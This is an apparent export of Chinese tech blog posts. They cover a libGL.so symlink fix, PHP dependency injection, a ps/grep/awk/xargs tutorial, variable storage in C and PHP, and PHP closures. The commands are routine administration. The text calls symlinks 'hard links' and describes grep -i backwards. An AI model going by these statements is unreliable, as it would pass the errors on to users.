确实能找到libGL.so。但因为不存在与之相关的硬链接，而导致libGL.so失效。这时候，应该怎么办呢？ a)首先我们进一步确认一下libGL.so是否失效。（毕竟之后涉及到在/usr/lib/x86_64-linux-gnu文件夹下删除，一不小心删错了，可是要命的） 1$ ls -l libGL.so 查看libGL的硬链接，如果libGL存在硬链接的话，会出现类似信息： 1lrwxrwxrwx 1 root root 13 12月 4 20:42 libGL.so -&gt; ..&#x2F;libGL.so.1 如果出现 10 libGL.so 或其他错误信息，则说明这个libGL.so已经失效。 b)之后，搜索是否存在libGL.so的硬链接。（一般如果第一步，安装已经做过的话，是肯定存在的） 12$ cd $ sudo find &#x2F;usr&#x2F;lib&#x2F; -name libGL.so* 打印信息 1234&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;mesa&#x2F;libGL.so&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libGL.so.1.0.0&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libGL.so&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libGL.so.1 我们发现在/usr/lib/x86_64-linux-gnu/文件夹下存在硬链接libGL.so.1.0.0接下来，我们的问题就只剩下如何让/usr/lib/x86_64-linux-gnu/mesa/libGL.so关联上/usr/lib/x86_64-linux-gnu/libGL.so.1.0.0 由于在/usr/lib/x86_64-linux-gnu/中libGL.so.1是libGL.so.1.0.0的软链接，所以我们只要将/usr/lib/x86_64-linux-gnu/mesa/libGL.so关联上/usr/lib/x86_64-linux-gnu/libGL.so.1即可 执行以下操作: 123$ cd &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;mesa&#x2F;$ sudo rm libGL.so #删除libGL.so$ sudo ln -s ..&#x2F;libGL.so.1 libGL.so #创建软链接 重新运行 1ls -l libGL.so 这时应该会有打印信息 1lrwxrwxrwx 1 root root 13 12月 4 20:42 libGL.so -&gt; ..&#x2F;libGL.so.1 再次运行 1$&#x2F;sbin&#x2F;ldconfig -v | grep GL 1&#x2F;sbin&#x2F;ldconfig.real: Cannot stat &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;mesa&#x2F;libGL.so: No such file or directory 上述错误会消失。 重新编译qt，编译成功！","categories":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/categories/Linux/"}],"tags":[{"name":"QT","slug":"QT","permalink":"https://wangbjun.github.io/tags/QT/"}]},{"title":"PHP依赖注入和控制反转","slug":"di-and-ioc","date":"2018-07-13T14:15:05.000Z","updated":"2020-01-08T09:23:39.937Z","comments":true,"path":"2018/07/13/di-and-ioc/","link":"","permalink":"https://wangbjun.github.io/2018/07/13/di-and-ioc/","excerpt":"这2个其实都算得上是一种设计模式或者说是一种软件设计思想，目的都是为了增加软件可维护性和扩展性，比如在Java Web框架SpringMVC 和PHP Web框架laravel里面都有应用。 首先得理解什么叫依赖？从宏观上看，得益于开源软件运行的兴起，很多时候我们写项目并不是什么都是从零开始，我们往往会利用很多现成的开源代码进行快速开发，能不重复造轮子最好，所以我们往往依赖很多开源组件。gradle、npm、composer 等工具的部分功能就是解决项目依赖问题。","text":"这2个其实都算得上是一种设计模式或者说是一种软件设计思想，目的都是为了增加软件可维护性和扩展性，比如在Java Web框架SpringMVC 和PHP Web框架laravel里面都有应用。 首先得理解什么叫依赖？从宏观上看，得益于开源软件运行的兴起，很多时候我们写项目并不是什么都是从零开始，我们往往会利用很多现成的开源代码进行快速开发，能不重复造轮子最好，所以我们往往依赖很多开源组件。gradle、npm、composer 等工具的部分功能就是解决项目依赖问题。 从微观上看，在实际写代码里面，对象与对象之间也会产生依赖关系，比如一个数据库查询类需要用到一个数据库连接、一个文章评论类用到一个文章，这里的依赖主要指对象之间的关系。 举个栗子，在一个 SessionService 里面你需要一个 FileSession ： 普通写法：12345678910111213141516class FileSession&#123; private $file; ... more code public function set($name, $value) &#123; echo \"set $name = $value into $this-&gt;file\\n\"; &#125; public function get($name) &#123; echo \"get $name value\\n\"; &#125;&#125; service类： 123456789101112131415161718192021class SessionService&#123; private $sessionHandler; public function __construct() &#123; $this-&gt;sessionHandler = new FileSession()； &#125; public function set($name, $value) &#123; $this-&gt;sessionHandler-&gt;set($name, $value); &#125; public function get($name) &#123; return $this-&gt;sessionHandler-&gt;get($name); &#125; ...more code&#125; 在这种普通写法里面，当我们需要一个 sessionHandler 的时候我们是直接在构造函数里面实例化，这样没啥问题，确实解决了依赖问题。但是依赖注入的另一个词“注入”更强调的是一种从外部而来的，而不是内部。 改造如下： 依赖注入写法：123456789101112131415161718192021class SessionService&#123; private $sessionHandler; public function __construct($sessionHandler) &#123; $this-&gt;sessionHandler = $sessionHandler； &#125; public function set($name, $value) &#123; $this-&gt;sessionHandler-&gt;set($name, $value); &#125; public function get($name) &#123; return $this-&gt;sessionHandler-&gt;get($name); &#125; ...more code&#125; 这种写法要求你在使用service的时候从外部传入一个handler，这就实现了依赖注入，注入的方式有很多种，刚才这种可以称之为构造器注入，还有一种叫setter注入，比如说，我们可以在service里面里面提供一个setter函数用于设置所需的handler： 1234public function setSessionHandler($sessionHandler)&#123; $this-&gt;sessionHandler = $sessionHandler&#125; 这种写法有哪些好处呢？一个是解耦，假如说这个FileSession实例化的时候还需要其它操作，比如传入一个配置参数，原本的写法可能就需要更改service类了，在构造函数里面啪啪啪写一堆。还有就是方便测试，既然解耦了就可以很方便的进行单元测试。另一个是控制反转，就是说这个FileSession外部传入的，是service类无法控制的，也就说控制权在于外部。 很多软件在设计的时候都采用分层结构，最典型的就是计算机网络，Http协议依赖TCP协议，层与层之间通过约定的的接口进行交互，既减少了代码的复杂度，也提高了可维修性。比如说你哪一天重构了FileSession，没问题，只要你保证所有方法的返回结果和之前一样就行。 为了更灵活的运用这种注入机制我们可能需要采用一个接口去约束，举个例子，我们先增加一个接口sessionHandler： 123456interface SessionHandler&#123; public function set($name, $value); public function get($name);&#125; 我们约定，只要你实现了这个接口，你就可以当一个sessionHandler，你就可以用来处理session，至于你怎么实现，service不管，比如说我们换一个redis： 123456789101112131415161718class RedisHandler implments SessionHandler&#123; private $redisInstance; public function __construct() &#123; $this-&gt;redisInstance = new Redis(); &#125; public function set($name, $value) &#123; $this-&gt;redisInstance-&gt;set($name, $value); &#125; public function get($name) &#123; return $this-&gt;redisInstance-&gt;get($name); &#125;&#125; 这时候我们可以在service的构造函数稍作修改，增加一个类型约束： 1234public function __construct(SessionHandler $sessionHandler)&#123; $this-&gt;sessionHandler = $sessionHandler；&#125; 这样的设计之后，好处显而易见，我们可以很轻松替换掉之前的fileSession，不改动service的一行代码，只要按照sessionHandler的接口去实现相应的方法就行，在laravel里面这样的接口就叫做 Contracts，下面就是框架里面的Cache缓存的 Contracts： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpnamespace Illuminate\\Contracts\\Cache;interface Store&#123; /** * Retrieve an item from the cache by key. * * @param string|array $key * @return mixed */ public function get($key); /** * Retrieve multiple items from the cache by key. * * Items not found in the cache will have a null value. * * @param array $keys * @return array */ public function many(array $keys); /** * Store an item in the cache for a given number of minutes. * * @param string $key * @param mixed $value * @param float|int $minutes * @return void */ public function put($key, $value, $minutes); /** * Store multiple items in the cache for a given number of minutes. * * @param array $values * @param float|int $minutes * @return void */ public function putMany(array $values, $minutes); ... more code&#125; 据我看到的，在laravel框架里面自带了至少5种实现，分别是Array、File、Database、Memcached、Redis, 如果你愿意你也可以自己去实现这个 Contracts，然后替换到框架里面的，不过框架本身实现的已经非常优秀了，除非你写的更好，一般情况下不需要这样做，但是laravel提供了这种可能。同样，在laravel框架里面session自带了Cache，Database，File这种几种实现，可以随意切换。 IOC容器说了最后，必须再说说IOC容器，IOC核心思想是通过IoC容器管理对象的生成、资源获取、销毁等生命周期，在IoC容器中建立对象与对象之间的依赖关系，IoC容器启动后，所有对象直接取用，调用层不再使用new操作符产生对象和建立对象之间的依赖关系。 简单理解就是不再使用new创建对象了，而且使用容器来管理对象，需要对象就从容器里面取，而且你只需要在参数上声明依赖，容器就直接给你对象了，炒鸡方便，比如在laravel里面，有很多这样的写法： 12345678910111213141516public function comment(Post $post, Request $request)&#123; $this-&gt;validate($request, [ 'content' =&gt; 'required|min:5' ]); $comment = new Comment([ 'content' =&gt; $request-&gt;get('content'), 'user_id' =&gt; auth()-&gt;user()-&gt;id, 'post_id' =&gt; $post-&gt;id, ]); $post-&gt;comments()-&gt;save($comment); return redirect()-&gt;back();&#125; 我们只需要在方法的参数上面标明所需的方法，就可以在代码直接用了，ioc容器替我们自动注入了依赖！","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://wangbjun.github.io/tags/PHP/"}]},{"title":"一条Linux命令","slug":"one-linux-command","date":"2018-06-08T07:01:06.000Z","updated":"2020-01-08T10:55:13.583Z","comments":true,"path":"2018/06/08/one-linux-command/","link":"","permalink":"https://wangbjun.github.io/2018/06/08/one-linux-command/","excerpt":"","text":"咱今天先从一个命令讲起，先看一个命令： 1ps -ef|grep nginx|awk '&#123;print $2&#125;'|xargs sudo kill -9 上面这条命令使用了管道组合了多个命令，作用是找个所有进程名字包含 nginx 的进程，然后 kill 这些进程。 1.首先是ps这个命令，简单的说是查看当前系统进程。1Usage: ps [OPTION] 在Linux的世界里，一个看似简单的命令，其背后的参数十分丰富，功能十分强大，如果你 man 一下这个命令，其手册打印出来估计有几十页，参数多达几十个，估计能记住的人不多，但是好在平时我们只用到其中几个参数就够用了。所以这里我也只是简单说下常用参数和常见应用场景，详细命令可以man或者help。 对于ps这个命令，按照手册的说法，它有不同的风格，有适合UNIX，有适合BSD，一般来说，ps -axu 和 ps -ef 效果是一样的。其结果如下： 1234567891011121314151617181920212223UID PID PPID C STIME TTY TIME CMDroot 1 0 0 10:12 ? 00:00:02 /sbin/init splashroot 2 0 0 10:12 ? 00:00:00 [kthreadd]root 3 2 0 10:12 ? 00:00:00 [rcu_gp]root 4 2 0 10:12 ? 00:00:00 [rcu_par_gp]root 6 2 0 10:12 ? 00:00:00 [kworker/0:0H]root 8 2 0 10:12 ? 00:00:00 [mm_percpu_wq]root 9 2 0 10:12 ? 00:00:00 [ksoftirqd/0]root 10 2 0 10:12 ? 00:00:20 [rcu_sched]root 11 2 0 10:12 ? 00:00:00 [rcu_bh]root 12 2 0 10:12 ? 00:00:00 [migration/0]root 13 2 0 10:12 ? 00:00:00 [idle_inject/0]root 15 2 0 10:12 ? 00:00:00 [cpuhp/0]root 16 2 0 10:12 ? 00:00:00 [cpuhp/1]root 17 2 0 10:12 ? 00:00:00 [idle_inject/1]root 18 2 0 10:12 ? 00:00:00 [migration/1]root 19 2 0 10:12 ? 00:00:00 [ksoftirqd/1]root 21 2 0 10:12 ? 00:00:00 [kworker/1:0H-kb]root 22 2 0 10:12 ? 00:00:00 [cpuhp/2]root 23 2 0 10:12 ? 00:00:00 [idle_inject/2]..................... 2.grep命令1Usage: grep [OPTION]... PATTERN [FILE]... 这个命令是用来搜索文本内容，支持丰富的参数, 最简单的用法： 12345678jwang@jwang:~$ grep server /etc/nginx/nginx.conf # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; ssl_prefer_server_ciphers on;# server &#123;# server &#123;jwang@jwang:~$ 上面的命令是打印出nginx.conf文件里面所有包含server文字的行，默认情况下，这个搜索是模糊匹配，而且是区分大小写的。 常用参数： 12345-i ：不忽略大小写 -n ：显示行号 -c ：显示匹配的数量 -v ：反向选择，亦即显示出没有 ‘搜寻字符串’ 内容的那一行-r ：递归搜索目录下所有文件 这个还支持正则表达式搜索，我平时用的少，大部分时候普通字符串就够用了。 还有几个挺有意思的参数： 123-B, --before-context=NUM 打印出搜索结果的前NUM行-A, --after-context=NUM 打印出搜索结果的后NUM行-C, --context=NUM 打印出搜索结果的前后NUM行 举个例子 grep -C 2 jwang /etc/passwd 123456jwang@jwang:~$ grep -C 2 jwang /etc/passwdsaned:x:119:127::/var/lib/saned:/bin/falseusbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/falsejwang:x:1000:1000:JWang,,,:/home/jwang:/bin/bashnvidia-persistenced:x:121:129:NVIDIA Persistence Daemon,,,:/:/sbin/nologinmysql:x:122:131:MySQL Server,,,:/nonexistent:/bin/false 所以 ps -ef|grep nginx的结果如下： 12345678910root 26642 1 0 17:36 ? 00:00:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;www-data 26643 26642 0 17:36 ? 00:00:00 nginx: worker processwww-data 26644 26642 0 17:36 ? 00:00:00 nginx: worker processwww-data 26645 26642 0 17:36 ? 00:00:00 nginx: worker processwww-data 26646 26642 0 17:36 ? 00:00:00 nginx: worker processwww-data 26647 26642 0 17:36 ? 00:00:00 nginx: worker processwww-data 26648 26642 0 17:36 ? 00:00:00 nginx: worker processwww-data 26649 26642 0 17:36 ? 00:00:00 nginx: worker processwww-data 26650 26642 0 17:36 ? 00:00:00 nginx: worker processjwang 28782 18097 0 18:31 pts/20 00:00:00 grep --color=auto nginx 3.awk命令 Awk是一种便于使用且表达能力强的程序设计语言，可应用于各种计算和数据处理任务。 看这介绍就知道awk多强大，都上升到语言的层次，先说说一开始的命令里面用法: awk &#39;{print $2}&#39; 默认情况下，awk使用 空格 去分割字符串，把上面的结果每一行按照空格去分割成N块，其中$0代表字符串本身，$1代表第一个块，$2代表第二个块，以此类推…. 所以ps -ef|grep nginx|awk &#39;{print $2}&#39;的结果是： 1234567891026642266432664426645266462664726648266492665028836 awk常用参数： 1231. -F fs or --field-separator fs 指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式2. -v var=value or --asign var=value 赋值一个用户定义变量。3. -f scripfile or --file scriptfile 从脚本文件中读取awk命令。 关于awk脚本，我们需要注意两个关键词BEGIN和END。 BEGIN{ 这里面放的是执行前的语句 } END {这里面放的是处理完所有的行后要执行的语句 } {这里面放的是处理每一行时要执行的语句} 假设有这么一个文件（学生成绩表）： 123456$ cat score.txtMarry 2143 78 84 77Jack 2321 66 78 45Tom 2122 48 77 71Mike 2537 87 97 95Bob 2415 40 57 62 我们的awk脚本如下： 123456789101112131415161718192021222324$ cat cal.awk#!/bin/awk -f#运行前BEGIN &#123; math = 0 english = 0 computer = 0 printf \"NAME NO. MATH ENGLISH COMPUTER TOTAL\\n\" printf \"---------------------------------------------\\n\"&#125;#运行中&#123; math+=$3 english+=$4 computer+=$5 printf \"%-6s %-6s %4d %8d %8d %8d\\n\", $1, $2, $3,$4,$5, $3+$4+$5&#125;#运行后END &#123; printf \"---------------------------------------------\\n\" printf \" TOTAL:%10d %8d %8d \\n\", math, english, computer printf \"AVERAGE:%10.2f %8.2f %8.2f\\n\", math/NR, english/NR, computer/NR&#125; 我们来看一下执行结果： 1234567891011$ awk -f cal.awk score.txtNAME NO. MATH ENGLISH COMPUTER TOTAL---------------------------------------------Marry 2143 78 84 77 239Jack 2321 66 78 45 189Tom 2122 48 77 71 196Mike 2537 87 97 95 279Bob 2415 40 57 62 159--------------------------------------------- TOTAL: 319 393 350AVERAGE: 63.80 78.60 70.00 再看一个案例，查出nginx日志里面状态为500的请求: 1awk &#39;$9 &#x3D;&#x3D; 500 &#123;print $0&#125;&#39; &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log awk还支持常见的if while等逻辑控制语句。 4.xargs命令1Usage: xargs [OPTION]... COMMAND [INITIAL-ARGS]... 这个命令作用是使用接收的内容当作参数去执行一条命令，一般都是配合管道使用，比如说在上面的例子里面，xargs的作用就是接收前面的pid，然后执行kill命令。 再看个例子： sudo find / -name nginx |xargs ls -l 这个命令意思是列出所有目录名或者文件名包含nginx的详情，其结果大概是这样： 123456789101112131415161718192021222324252627282930313233343536-rw-r--r-- 1 root root 389 2月 12 2017 /etc/default/nginx-rwxr-xr-x 1 root root 4579 2月 12 2017 /etc/init.d/nginx-rw-r--r-- 1 root root 329 2月 12 2017 /etc/logrotate.d/nginx-rw-r--r-- 1 root root 374 2月 12 2017 /etc/ufw/applications.d/nginx-rwxr-xr-x 1 root root 1230768 7月 12 2017 /usr/sbin/nginx/etc/nginx:total 56drwxr-xr-x 2 root root 4096 7月 12 2017 conf.d-rw-r--r-- 1 root root 1077 2月 12 2017 fastcgi.conf-rw-r--r-- 1 root root 1007 2月 12 2017 fastcgi_params-rw-r--r-- 1 root root 2837 2月 12 2017 koi-utf-rw-r--r-- 1 root root 2223 2月 12 2017 koi-win-rw-r--r-- 1 root root 3957 2月 12 2017 mime.types-rw-r--r-- 1 root root 1462 2月 12 2017 nginx.conf-rw-r--r-- 1 root root 180 2月 12 2017 proxy_params-rw-r--r-- 1 root root 636 2月 12 2017 scgi_paramsdrwxr-xr-x 2 root root 4096 11月 7 14:01 sites-availabledrwxr-xr-x 2 root root 4096 11月 7 14:01 sites-enableddrwxr-xr-x 2 root root 4096 5月 6 2018 snippets-rw-r--r-- 1 root root 664 2月 12 2017 uwsgi_params-rw-r--r-- 1 root root 3071 2月 12 2017 win-utf/home/jwang/Documents/Work/trunk/webroot/static/lib/codemirror/mode/nginx:total 20-rw-rw-r-- 1 jwang jwang 5230 5月 7 2018 index.html-rw-rw-r-- 1 jwang jwang 10169 5月 7 2018 nginx.js/usr/share/doc/nginx:total 12lrwxrwxrwx 1 root root 33 7月 12 2017 changelog.Debian.gz -&gt; ../nginx-core/changelog.Debian.gz-rw-r--r-- 1 root root 8641 2月 12 2017 copyright/usr/share/nginx:total 4drwxr-xr-x 2 root root 4096 5月 6 2018 html 所以，最后的xargs命令是把前面筛选得到的pid作为参数传给命令kill执行，有时候会有权限问题，所以这里加了个sudo。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://wangbjun.github.io/tags/Linux/"}]},{"title":"变量名存放在哪里？","slug":"where-is-variable-value","date":"2018-06-07T09:08:41.000Z","updated":"2020-01-08T09:49:09.411Z","comments":true,"path":"2018/06/07/where-is-variable-value/","link":"","permalink":"https://wangbjun.github.io/2018/06/07/where-is-variable-value/","excerpt":"这是一个有意思且无聊的问题，之前在网上看到有人问道这个问题，比如说在PHP里面我们写下 $name = &quot;名字&quot; 这样的代码语句，在代码运行的时候，$name 在哪里呢？ 了解了变量在内存中存储方式的人会知道，一般变量的值在存放在栈内存里面的，但是名字呢？ 针对这个问题，咱们先要区分一下编译型语言和解释型语言，这2种语言运行方式完全不一样，C/C++是典型的编译型语言，而且PHP/JS则是典型的解释型语言。","text":"这是一个有意思且无聊的问题，之前在网上看到有人问道这个问题，比如说在PHP里面我们写下 $name = &quot;名字&quot; 这样的代码语句，在代码运行的时候，$name 在哪里呢？ 了解了变量在内存中存储方式的人会知道，一般变量的值在存放在栈内存里面的，但是名字呢？ 针对这个问题，咱们先要区分一下编译型语言和解释型语言，这2种语言运行方式完全不一样，C/C++是典型的编译型语言，而且PHP/JS则是典型的解释型语言。 编译型语言要想运行，必须使用一个编译器去把代码转换成目标平台机器代码。而解释型语言是通过一个解释器实时翻译成一种中间代码一行行运行。前者又被称为静态语言，后者又被称为动态语言。像Java，C#则属于这2种中间，因为他们有一个预编译的过程，会先把代码转换成中间代码存放起来，在Java里面就叫字节码，然后在虚拟机（jvm）里面执行，效率比纯解释执行高。PHP就有一个opcache扩展可以把生成的中间代码opcode缓存起来以提高效率，不必每次运行的时候都生成。 说这么多，想说明一个问题，那就是变量名和变量在这2种语言里面的存储是有区别的，回到最开始的问题，咱先说说经典的C语言： C语言里面变量和变量名的存储为了说明这个问题，咱们简单的来说一下C里面变量在内存里面的存储： 1.栈区（stack）— 由编译器自动分配释放 ，存放为运行函数而分配的局部变量、函数参数、返回数据、返回地址等。 2.堆区（heap） — 一般由程序员分配释放， 用来存储数组，结构体，对象等。若程序员不释放，程序结束时可能由OS回收。 3.全局区（静态区）（static）— 存放全局变量、静态数据、常量。程序结束后由系统释放。 4.文字常量区 — 常量字符串就是放在这里的。 程序结束后由系统释放。 5.程序代码区 — 存放函数体（类成员函数和全局函数）的二进制代码。 栈内存是有大小限制的，比如默认情况下，Linux平台的是8MB，如果超过这个限制，就会出现 stackoverflow，而堆内存并无限制，内存有多大就可以申请多大。 看完上面的说明，我们可以得出一个结论: 全局变量存放在全局区，在程序一开始就分配好了，而且局部变量在存放在栈区，运行的时候分配内存，用完之后内存会被自动释放。 但是这好像并没有说明变量名在哪里吧？比如下面这段C代码,a, b到底存在哪里？： 1234567891011#include &lt;stdio.h&gt;int a = 1; //全局初始化区int main(int argc, char const *argv[])&#123; int b; //栈 b = a + 5; printf(\"%d\\n\", b); return 0;&#125; 为了搞明白这个问题，我们需要了解一下C语言的执行过程,C语言执行需要经过预处理(Preprocessing)、编译(Compilation)、汇编(Assemble)、链接(Linking)等几个阶段，在编译成汇编语言这个阶段就已经没有变量名了，使用gdb可以查看编译后的汇编代码： 12345678910111213141516171819 (gdb) disass mainDump of assembler code for function main: 0x0000000000400526 &lt;+0&gt;: push %rbp 0x0000000000400527 &lt;+1&gt;: mov %rsp,%rbp 0x000000000040052a &lt;+4&gt;: sub $0x20,%rsp 0x000000000040052e &lt;+8&gt;: mov %edi,-0x14(%rbp) 0x0000000000400531 &lt;+11&gt;: mov %rsi,-0x20(%rbp) 0x0000000000400535 &lt;+15&gt;: mov 0x200afd(%rip),%eax # 0x601038 &lt;a&gt; 0x000000000040053b &lt;+21&gt;: add $0x5,%eax 0x000000000040053e &lt;+24&gt;: mov %eax,-0x4(%rbp) 0x0000000000400541 &lt;+27&gt;: mov -0x4(%rbp),%eax 0x0000000000400544 &lt;+30&gt;: mov %eax,%esi 0x0000000000400546 &lt;+32&gt;: mov $0x4005e4,%edi 0x000000000040054b &lt;+37&gt;: mov $0x0,%eax 0x0000000000400550 &lt;+42&gt;: callq 0x400400 &lt;printf@plt&gt;=&gt; 0x0000000000400555 &lt;+47&gt;: mov $0x0,%eax 0x000000000040055a &lt;+52&gt;: leaveq 0x000000000040055b &lt;+53&gt;: retq End of assembler dump. 虽然上面这个很难读懂，但是应该能看到在这一大堆汇编指令执行的背后，并没有变量名这个东西，所有的变量名到最后都变成了内存地址，汇编指令操作的是各种寄存器和内存地址。 定义int a;时,编译器分配4个字节内存,并命名该4个字节的空间名字为a(即变量名),当用到变量名a时,就是在使用那4个字节的内存空间。 5是一个常数,在程序编译时存放在代码的常量区存放着它的值(就是5),当执行a=5时,程序将5这个常量拷贝到a所在的4个字节空间中,就完成了赋值操作.a是我们对那个整形变量的4个字节取的”名字”,是我们人为给的,实际上计算机并不存储a这个名字,只是我们编程时给那4个字节内存取个名字好用。 实际上程序在编译时,所有的a都转换为了那个地址空间了,编译成机器代码后,没有a这个说法了。 a这个名字只存在于我们编写的代码中.5不是被随机分配的,而总是位于程序的数据段中,可能在不同的机器上在数据段中的位置可能不一致,它的地址其实不能以我们常用到的内存地址来理解,因为牵扯到一个叫”计算机寻址方式”的问题。 以上的内容有参考网上很多文章，仅供参考！有一点需要明白在操作系统里面，程序的内存地址并不是物理地址，而且通过一个基址+偏移量的方式的计算得到的虚拟地址，操作系统为了更好的管理应用在内存这个层面做了很多抽象。 PHP里面的变量和变量名存储PHP语句在执行的时候需要zend引擎进行词法分析，语法分析，编译成opcode，opcode可以理解为一种类似机器指令的语句，然后由zend引擎去执行。 有扩展可以打印出生成的opcode，下面看一下： PHP代码： 12345678910&lt;?php$a = 1;$b = 2;function hello($d,$e)&#123; $c = $d+$e;&#125;hello($a, $b); opcode结果： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849jwang@jwang:~$ php7.0 -dvld.active=1 ~/index.php Finding entry pointsBranch analysis from position: 01 jumps found. (Code = 62) Position 1 = -2filename: /home/jwang/index.phpfunction name: (null)number of ops: 14compiled vars: !0 = $a, !1 = $bline #* E I O op fetch ext return operands------------------------------------------------------------------------------------- 2 0 E &gt; EXT_STMT 1 ASSIGN !0, 1 3 2 EXT_STMT 3 ASSIGN !1, 2 5 4 EXT_STMT 5 NOP 10 6 EXT_STMT 7 INIT_FCALL 'hello' 8 EXT_FCALL_BEGIN 9 SEND_VAR !0 10 SEND_VAR !1 11 DO_FCALL 0 12 EXT_FCALL_END 11 13 &gt; RETURN 1branch: # 0; line: 2- 11; sop: 0; eop: 13; out0: -2path #1: 0, Function hello:Finding entry pointsBranch analysis from position: 01 jumps found. (Code = 62) Position 1 = -2filename: /home/jwang/index.phpfunction name: hellonumber of ops: 8compiled vars: !0 = $d, !1 = $e, !2 = $cline #* E I O op fetch ext return operands------------------------------------------------------------------------------------- 5 0 E &gt; EXT_NOP 1 RECV !0 2 RECV !1 7 3 EXT_STMT 4 ADD ~3 !0, !1 5 ASSIGN !2, ~3 8 6 EXT_STMT 7 &gt; RETURN nullbranch: # 0; line: 5- 8; sop: 0; eop: 7; out0: -2path #1: 0, End of function hello zend引擎会把PHP代码转换成一组op命令操作，上面的就有2组操作。在第一组命令里面可以看到在开始的时候，有一个compiled vars: !0 = $a, !1 = $b, 然后后面有2个ASSIGN操作。可以看到在最终执行的时候并不是使用的$a, $b，而是使用了!0, !1这样的符号去代替。 !0, !1并不是一个固定的值，它每次执行的时候代表的是op命令的操作数。op命令是zend引擎自己定义好的一些操作，具体怎么执行得看zend引擎怎么处理了。 PHP的变量则是通过一个 _zval_struct 结构体形式存储的，讲道理，大部分时候还在存储在堆内存里面的，既然存储在堆里面那么就必须手动释放内存，所以才有了自动垃圾回收机制！ 所以，最后总结一下，变量名说到底还是方便程序员编程的，名字起的好便于记忆和阅读代码，就像人一样，名字只是一个代号，本质上只是一堆碳水化合物。 变量名在代码运行的时候都会被一些特殊的符号代替，内存里面并不会有变量名，所以变量名写的长并不会影响运行速度，用中文还是英文也不影响。而变量无论什么类型，最终运行的时候操作的还是内存地址里面数据，变量之所以有类型，是为了方便编译器处理。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://wangbjun.github.io/categories/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"变量名","slug":"变量名","permalink":"https://wangbjun.github.io/tags/%E5%8F%98%E9%87%8F%E5%90%8D/"}]},{"title":"PHP匿名函数和闭包","slug":"php-closure-function","date":"2018-04-05T11:00:03.000Z","updated":"2020-01-08T09:43:32.165Z","comments":true,"path":"2018/04/05/php-closure-function/","link":"","permalink":"https://wangbjun.github.io/2018/04/05/php-closure-function/","excerpt":"一.什么是闭包？先看看百度百科的介绍： 闭包包含自由（未绑定到特定对象）变量，这些变量不是在这个代码块内或者任何全局上下文中定义的，而是在定义代码块的环境中定义（局部变量）。“闭包” 一词来源于以下两者的结合：要执行的代码块（由于自由变量被包含在代码块中，这些自由变量以及它们引用的对象没有被释放）和为自由变量提供绑定的计算环境（作用域）。在PHP、Scala、Scheme、Common Lisp、Smalltalk、Groovy、JavaScript、Ruby、 Python、Go、Lua、objective c、swift 以及Java（Java8及以上）等语言中都能找到对闭包不同程度的支持。 说实话，这个介绍虽然专业，但是有点僵硬不太容易理解，闭包是一种设计思想，而不是一种语法特性，在PHP语言里面，匿名函数就是闭包的一种实现。 二.匿名函数这个我相信大家都多多少少用过，看一下代码： 123456$f &#x3D; function () &#123; $a &#x3D; 1; $b &#x3D; 2; return $a + $b;&#125;;var_dump($f); 输出结果是： 12class Closure#1 (0) &#123;&#125;","text":"一.什么是闭包？先看看百度百科的介绍： 闭包包含自由（未绑定到特定对象）变量，这些变量不是在这个代码块内或者任何全局上下文中定义的，而是在定义代码块的环境中定义（局部变量）。“闭包” 一词来源于以下两者的结合：要执行的代码块（由于自由变量被包含在代码块中，这些自由变量以及它们引用的对象没有被释放）和为自由变量提供绑定的计算环境（作用域）。在PHP、Scala、Scheme、Common Lisp、Smalltalk、Groovy、JavaScript、Ruby、 Python、Go、Lua、objective c、swift 以及Java（Java8及以上）等语言中都能找到对闭包不同程度的支持。 说实话，这个介绍虽然专业，但是有点僵硬不太容易理解，闭包是一种设计思想，而不是一种语法特性，在PHP语言里面，匿名函数就是闭包的一种实现。 二.匿名函数这个我相信大家都多多少少用过，看一下代码： 123456$f &#x3D; function () &#123; $a &#x3D; 1; $b &#x3D; 2; return $a + $b;&#125;;var_dump($f); 输出结果是： 12class Closure#1 (0) &#123;&#125; 可见，PHP中匿名函数就是闭包，也可以理解为闭包就是把这个函数赋值给一个变量，这时候这个变量保存的就是这个函数的内存地址。 如何去调用这个闭包函数呢？很简单，在这个例子里面只要 $f() 就可以了 1var_dump($f()); #结果是：3 当然这个匿名函数也是可以传参的，你可以这样写： 12345$f &#x3D; function ($c) &#123; $a &#x3D; 1; $b &#x3D; 2; return $a + $b + $c;&#125;; 这样你在调用的时候就可以传入参数，类似 $f(3), 但是有一点需要注意，如果这时候你想在定义闭包函数的时候使用外部变量，举个例子 123456$out &#x3D; 100;$f &#x3D; function ($c) &#123; $a &#x3D; 1; $b &#x3D; 2; return $out - ($a + $b + $c); #报错，无法引用外部变量out&#125;; 这时候就体现了闭包封闭的特性，但是PHP提供了一个 use 关键字，可以使用下面这个写法： 123456$out &#x3D; 100;$f &#x3D; function ($c) use ($out) &#123; $a &#x3D; 1; $b &#x3D; 2; return $out - ($a + $b + $c);&#125;; 三.闭包到底有啥用？一般来说还是在框架以及一些架构设计里面会用到，这里先举2个小例子： 123456789101112$arr &#x3D; [1, 2, 3, 4, 5];&#x2F;&#x2F;使用array_reduce求和function sum($arr)&#123; return array_reduce($arr, function ($x, $y) &#123; return $x + $y; &#125;);&#125;var_dump(sum($arr)); 代码里面使用了 array_reduce 